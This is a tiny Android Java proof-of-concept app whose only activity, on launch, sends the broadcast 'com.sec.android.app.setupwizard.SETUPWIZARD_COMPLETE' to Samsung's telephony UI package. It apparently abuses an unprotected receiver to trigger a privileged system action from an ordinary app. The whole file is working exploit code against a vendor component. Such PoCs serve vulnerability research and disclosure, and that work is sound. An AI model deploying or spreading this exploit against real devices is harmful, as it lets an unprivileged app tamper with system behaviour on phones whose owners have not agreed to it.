package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE");
        i.setPackage("com.samsung.android.app.telephonyui");
        sendBroadcast(i);
    }
}